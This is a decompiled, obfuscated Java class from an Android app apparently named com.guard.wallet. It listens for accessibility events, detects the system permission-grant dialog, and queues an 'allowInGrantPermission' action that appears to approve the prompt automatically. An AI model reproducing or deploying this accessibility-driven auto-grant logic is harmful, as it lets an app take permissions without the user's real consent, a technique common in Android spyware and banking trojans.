package p012o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.thread.AbstractC0243l;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;

/* renamed from: o.l */
/* loaded from: classes.dex */
public final class C0423l extends C0416e {

    /* renamed from: o */
    public static final /* synthetic */ int f929o = 0;

    /* renamed from: n */
    public final ConcurrentLinkedQueue f930n;

    public C0423l() {
        super(m1132J(), "com.android.permissioncontroller");
        this.f930n = new ConcurrentLinkedQueue();
    }

    /* renamed from: H */
    public static ListenWindow m1130H() {
        ListenWindow listenWindow = new ListenWindow(null, "com.android.packageinstaller.permission.ui.GrantPermissionsActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    /* renamed from: I */
    public static ListenWindow m1131I() {
        ListenWindow listenWindow = new ListenWindow(null, "com.android.permissioncontroller.permission.ui.GrantPermissionsActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    /* renamed from: J */
    public static LinkedList m1132J() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(m1130H());
        linkedList.add(m1131I());
        return linkedList;
    }

    @Override // p012o.C0416e
    /* renamed from: d */
    public final void mo1001d() {
        AbstractC0243l.m591a(this.f864c);
        this.f930n.clear();
        super.mo1001d();
    }

    @Override // p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        boolean z2;
        super.mo1002u(accessibilityEvent, str, str2);
        LinkedList linkedList = new LinkedList();
        linkedList.add(m1130H());
        linkedList.add(m1131I());
        if (m1078q(linkedList)) {
            Log.d("o.l", "已进入是否允许权限申请窗口");
            z2 = true;
        } else {
            z2 = false;
        }
        if (z2) {
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f930n;
            if (concurrentLinkedQueue.contains("allowInGrantPermission")) {
                return;
            }
            concurrentLinkedQueue.add("allowInGrantPermission");
            AbstractC0243l.m593c(new RunnableC0412a(this, 2), this.f864c);
        }
    }
}
